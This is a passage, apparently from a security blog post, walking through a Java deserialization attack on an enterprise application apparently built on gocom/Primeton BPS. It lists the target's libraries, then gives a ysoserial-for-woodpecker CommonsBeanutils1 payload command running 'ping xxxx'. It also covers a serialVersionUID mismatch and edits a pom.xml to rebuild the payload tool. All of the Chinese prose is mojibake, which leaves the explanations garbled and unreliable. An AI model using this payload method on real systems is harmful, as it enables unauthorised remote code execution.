number">0.</span>x<span class="token punctuation">.</span>jarftpcli<span class="token punctuation">.</span>jargeronimo<span class="token operator">-</span>commonj_1<span class="token punctuation">.</span><span class="token number">1_</span>spec<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jargeronimo<span class="token operator">-</span>stax<span class="token operator">-</span>api_1<span class="token punctuation">.</span><span class="token number">0_</span>spec<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarguide<span class="token punctuation">.</span>jarhbasecli<span class="token punctuation">.</span>jarhdfsfilecli<span class="token punctuation">.</span>jarhessian<span class="token operator">-</span>jdk1<span class="token punctuation">.</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.20</span><span class="token punctuation">.</span>jarhivecli<span class="token punctuation">.</span>jarhtmlparser<span class="token operator">-</span><span class="token number">1.6</span><span class="token punctuation">.</span>jarhttpclient<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jarhttpcore<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.4</span><span class="token punctuation">.</span>jaricu4j_3_4_5<span class="token punctuation">.</span>jaritext2_rq<span class="token punctuation">.</span>jaritext5<span class="token operator">-</span>itextpdf<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.11</span><span class="token punctuation">.</span>jarjackson<span class="token operator">-</span>core<span class="token operator">-</span>asl<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jarjackson<span class="token operator">-</span>jaxrs<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jarjackson<span class="token operator">-</span>mapper<span class="token operator">-</span>asl<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jarjackson<span class="token operator">-</span>xc<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jarjai_codec<span class="token punctuation">.</span>jarjai_core<span class="token punctuation">.</span>jarjavassist<span class="token operator">-</span><span class="token number">3.3</span><span class="token punctuation">.</span>jarjavax<span class="token punctuation">.</span>ejb<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jarjavax<span class="token punctuation">.</span>jms<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jarjavax<span class="token punctuation">.</span>transaction<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarjaxb<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jarjaxb<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.4</span><span class="token punctuation">.</span>jarjaxb2<span class="token operator">-</span>reflection<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.4</span><span class="token punctuation">.</span>jarjaxen<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jarjaxrs<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarjaxws<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jarjdom<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarjdom<span class="token punctuation">.</span>jarjettison<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarjs<span class="token operator">-</span><span class="token number">1.7</span>R2<span class="token punctuation">.</span>jarjs<span class="token punctuation">.</span>jarjsobject<span class="token punctuation">.</span>jarjson<span class="token punctuation">.</span>jarjson_simple<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jarjsr181<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarjsr250<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarjunit<span class="token operator">-</span><span class="token number">4.10</span><span class="token punctuation">.</span>jarjxl<span class="token punctuation">.</span>jarjxls<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">0.9</span><span class="token number">.6</span><span class="token punctuation">.</span>jarlog4j<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.8</span><span class="token punctuation">.</span>jarlog4j<span class="token operator">-</span>over<span class="token operator">-</span>slf4j<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jarmail<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarmail<span class="token punctuation">.</span>jarmex<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarmondrian<span class="token operator">-</span><span class="token number">3.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jarmx4j<span class="token operator">-</span>tools<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jarneethi<span class="token operator">-</span><span class="token number">2.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jarnekohtml<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.7</span><span class="token punctuation">.</span>jarnumformat<span class="token punctuation">.</span>jarognl<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">.</span>jarolap4j<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.0</span><span class="token punctuation">.</span>jarolap4jcli<span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>common<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>ecore<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>ecore<span class="token punctuation">.</span>xmi<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>xsd<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bizform<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bizform<span class="token punctuation">.</span>components<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>components<span class="token punctuation">.</span>bpff<span class="token punctuation">.</span>control<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarorg<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarpdf<span class="token operator">-</span>transcoder<span class="token punctuation">.</span>jarpoi<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi<span class="token operator">-</span>excelant<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi<span class="token operator">-</span>ooxml<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi<span class="token operator">-</span>ooxml<span class="token operator">-</span>schemas<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi<span class="token operator">-</span>scratchpad<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jarpoi2<span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>commons<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>das<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>data<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>datacontext<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>deploy<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>engine<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>jdbc<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>l7e<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>runtime<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>scriptengine<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>spring<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>spring4das<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>statistic<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarptp<span class="token operator">-</span>server<span class="token operator">-</span>wsclient<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar<span class="token class-name">Qrcode_swetake</span><span class="token punctuation">.</span>jarquartz<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.2</span><span class="token punctuation">.</span>jarrampart<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarrampart<span class="token operator">-</span>policy<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarrampart<span class="token operator">-</span>trust<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarraqsoftReport<span class="token punctuation">.</span>jarrediscli<span class="token punctuation">.</span>jarreport4<span class="token punctuation">.</span>jarreport5StaticHtml<span class="token punctuation">.</span>jarresteasy<span class="token operator">-</span>client<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarresteasy<span class="token operator">-</span>jackson<span class="token operator">-</span>provider<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarresteasy<span class="token operator">-</span>jaxrs<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarresteasy<span class="token operator">-</span>multipart<span class="token operator">-</span>provider<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarsac<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarsapcli<span class="token punctuation">.</span>jarsca<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarsdo<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarslf4j<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jarsnmp4j<span class="token operator">-</span><span class="token number">2.3</span><span class="token number">.1</span><span class="token punctuation">.</span>jarsoap<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jarsparkcli<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>aop<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>beans<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>context<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>expression<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>jdbc<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>jms<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarspring<span class="token operator">-</span>tx<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jarsso<span class="token operator">-</span>client<span class="token operator">-</span>java<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jarsso<span class="token operator">-</span>proxy<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jarstax<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarsubstance<span class="token operator">-</span><span class="token number">7.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarwebservicecli<span class="token punctuation">.</span>jarwebutil<span class="token punctuation">.</span>jarwsdl4j<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.2</span><span class="token punctuation">.</span>jarwss4j<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jarxalan<span class="token operator">-</span><span class="token number">2.5</span><span class="token number">.0</span><span class="token punctuation">.</span>jarxalan<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">.</span>jarxercesImpl<span class="token operator">-</span><span class="token number">2.8</span><span class="token number">.1</span><span class="token punctuation">.</span>jarxercesImpl<span class="token punctuation">.</span>jarxml<span class="token operator">-</span>apis<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.01</span><span class="token punctuation">.</span>jarxml<span class="token operator">-</span>apis<span class="token operator">-</span>ext<span class="token punctuation">.</span>jarxml<span class="token operator">-</span>apis<span class="token punctuation">.</span>jarxmlbeans<span class="token operator">-</span><span class="token number">2.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jarxmlbeans<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">.</span>jar<span class="token class-name">XmlSchema</span><span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.2</span><span class="token punctuation">.</span>jarxmlsec<span class="token operator">-</span><span class="token number">1.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jarxmlworker<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.6</span><span class="token punctuation">.</span>jarxstream<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.2</span><span class="token punctuation">.</span>jarzxing_core<span class="token punctuation">.</span>jar</code></pre><p>ä»ä¸Šé¢çš„jaråŒ…æˆ‘ä»¬çŸ¥é“ commons-collections  commons-beanutils åœ¨åŠ ä¸Šä¹‹å‰çš„æˆ‘ä»¬å¯ä»¥çŒœå‡ºã€‚ä½¿ç”¨çš„åº”è¯¥æ˜¯org.apache.commons.beanutils.BeanComparator  commons-beanutils ã€‚æ‰€ä»¥æˆ‘ä»¬å°±æœ‰ç›®æ ‡äº†ç›´æ¥ä½¿ç”¨commons-beanutils  è¿›è¡Œæ„é€ ã€‚</p><p>java -jar ysoserial-for-woodpecker-0.5.2.jar -g CommonsBeanutils1 -a raw_cmd:â€ping xxxxâ€  â€“dirt-data-length 400000 &gt;curl4.cer</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291724134.png" alt="æ‰“å¤±è´¥äº†"><br>çœ‹ä¸€ä¸‹å›æ˜¾æˆ‘å»æ²¡æœ‰éš¾å€’æ˜¯ä¸å‡ºç½‘æ²¡æ¼æ´ä¸å¯èƒ½<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291753731.png" alt="çœ‹å›æ˜¾"><br>æˆ‘ä»¬è¿™ä¸ªæ—¶å€™è¦çœ‹ä¸€ä¸ªå…³é”®æŠ¥é”™ç‚¹ serialVersionUID è¿™ä¸ªæ˜¯ååºåˆ—åŒ–çš„æ—¶å€™å¿…é¡»è¦å¸¦çš„ç‚¹ã€‚é‚£æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºæ¥æ˜¯ä¸æ˜¯ ç›®æ ‡ç‰ˆæœ¬å’Œæˆ‘ä»¬å·¥å…·çš„ç‰ˆæœ¬ä¸ä¸€æ ·å¯¼è‡´çš„è¿™ç§é—®é¢˜ã€‚</p><pre class="language-java" data-language="java"><code class="language-java">serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2044202215314119608</span><span class="token punctuation">,</span> local <span class="token keyword">class</span> serialVersionUID <span class="token operator">=</span> <span class="token number">2573799559215537819</span>u</code></pre><p>è½¬å˜æ€è·¯æˆ‘ä»¬ä½¿ç”¨mavené‡æ–°ç¼–è¯‘ä¸€ä¸‹ ä¸‹è½½æºä»£ç <br><a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">https://github.com/woodpecker-framework/ysoserial-for-woodpecker</a></p><p>ä½¿ç”¨mvnç¼–è¯‘æŠ¥é”™å¦‚ä¸‹:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token class-name">Unknown</span> lifecycle phase <span class="token string">"mvn"</span><span class="token punctuation">.</span> <span class="token class-name">You</span> must specify a valid lifecycle phase or a goal in the format <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>prefix<span class="token operator">></span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span> or <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>group<span class="token operator">-</span>id<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>artifact<span class="token operator">-</span>id<span class="token operator">></span><span class="token punctuation">[</span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>version<span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span><span class="token punctuation">.</span> <span class="token class-name">Available</span> lifecycle phases are<span class="token operator">:</span> validate<span class="token punctuation">,</span> initialize<span class="token punctuation">,</span> generate<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>resources<span class="token punctuation">,</span> compile<span class="token punctuation">,</span> process<span class="token operator">-</span>classes<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> test<span class="token operator">-</span>compile<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>classes<span class="token punctuation">,</span> test<span class="token punctuation">,</span> prepare<span class="token operator">-</span><span class="token keyword">package</span><span class="token punctuation">,</span> <span class="token keyword">package</span><span class="token punctuation">,</span> pre<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> integration<span class="token operator">-</span>test<span class="token punctuation">,</span> post<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> verify<span class="token punctuation">,</span> install<span class="token punctuation">,</span> deploy<span class="token punctuation">,</span> pre<span class="token operator">-</span>clean<span class="token punctuation">,</span> clean<span class="token punctuation">,</span> post<span class="token operator">-</span>clean<span class="token punctuation">,</span> pre<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token punctuation">,</span> post<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token operator">-</span>deploy<span class="token punctuation">.</span> <span class="token operator">-></span> <span class="token punctuation">[</span><span class="token class-name">Help</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>maven<span class="token punctuation">.</span>lifecycle<span class="token punctuation">.</span></span>LifecyclePhaseNotFoundException</span><span class="token operator">:</span> <span class="token class-name">Unknown</span> lifecycle phase <span class="token string">"mvn"</span><span class="token punctuation">.</span> <span class="token class-name">You</span> must specify a valid lifecycle phase or a goal in the format <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>prefix<span class="token operator">></span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span> or <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>group<span class="token operator">-</span>id<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>artifact<span class="token operator">-</span>id<span class="token operator">></span><span class="token punctuation">[</span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>version<span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span><span class="token punctuation">.</span> <span class="token class-name">Available</span> lifecycle phases are<span class="token operator">:</span> validate<span class="token punctuation">,</span> initialize<span class="token punctuation">,</span> generate<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>resources<span class="token punctuation">,</span> compile<span class="token punctuation">,</span> process<span class="token operator">-</span>classes<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> test<span class="token operator">-</span>compile<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>classes<span class="token punctuation">,</span> test<span class="token punctuation">,</span> prepare<span class="token operator">-</span><span class="token keyword">package</span><span class="token punctuation">,</span> <span class="token keyword">package</span><span class="token punctuation">,</span> pre<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> integration<span class="token operator">-</span>test<span class="token punctuation">,</span> post<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> verify<span class="token punctuation">,</span> install<span class="token punctuation">,</span> deploy<span class="token punctuation">,</span> pre<span class="token operator">-</span>clean<span class="token punctuation">,</span> clean<span class="token punctuation">,</span> post<span class="token operator">-</span>clean<span class="token punctuation">,</span> pre<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token punctuation">,</span> post<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token operator">-</span>deploy<span class="token punctuation">.</span></code></pre><p>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹pom.xmlæ–‡ä»¶</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>defaultGoal</span><span class="token punctuation">></span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>defaultGoal</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- maximize compatibility --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- ignore noisy internal api warnings --></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>compilerArgument</span><span class="token punctuation">></span></span>-XDignore.symbol.file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>compilerArgument</span><span class="token punctuation">></span></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fork</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fork</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>finalName</span><span class="token punctuation">></span></span>$&#123;project.artifactId&#125;-$&#123;project.version&#125;-all<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>finalName</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appendAssemblyId</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appendAssemblyId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">></span></span>me.gv7.woodpecker.yso.GeneratePayload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">></span></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptor</span><span class="token punctuation">></span></span>assembly.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptor</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>make-assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token 